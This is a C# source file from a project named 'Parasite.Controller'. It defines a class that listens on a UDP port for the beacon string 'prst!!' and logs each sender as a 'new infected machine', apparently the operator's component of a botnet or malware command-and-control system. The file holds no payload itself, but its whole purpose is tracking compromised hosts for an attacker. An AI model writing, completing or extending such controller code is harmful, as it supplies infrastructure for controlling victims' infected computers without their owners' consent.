using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Parasite.Controller
{
    public class BeaconFinder
    {
        public delegate void FoundBeacon(string ip);
        public event FoundBeacon FoundBeaconEvent;
        public bool Running { get { return this._running; } }

        private List<string> _beacons;
        private Thread _finderThread;
        private bool _running = false;
        private int _port;

        public BeaconFinder(int port)
        {
            this._beacons = new List<string>();
            this._finderThread = new Thread(new ThreadStart(findBeacons));
            this._port = port;
        }
        
        public void Start()
        {
            _running = true;
            _finderThread.Start();
        }

        private void findBeacons()
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            IPEndPoint ipendpoint = new IPEndPoint(IPAddress.Any, this._port);
            socket.Bind(ipendpoint);
            Console.WriteLine("Beacon finder started.");

            while (_running)
            {
                EndPoint endpoint = (EndPoint)ipendpoint;

                byte[] data = new byte[1024];
                int recv = socket.ReceiveFrom(data, ref endpoint);

                string stringData = Encoding.UTF8.GetString(data, 0, recv);
                var ep = endpoint.ToString().Split(':')[0];
                if (stringData == "prst!!" && !_beacons.Contains(ep))
                {
                    Console.WriteLine($"Found new infected machine at {ep}");
                    _beacons.Add(ep);
                    FoundBeaconEvent.Invoke(ep);
                }
            }

            socket.Close();
        }
    }
}
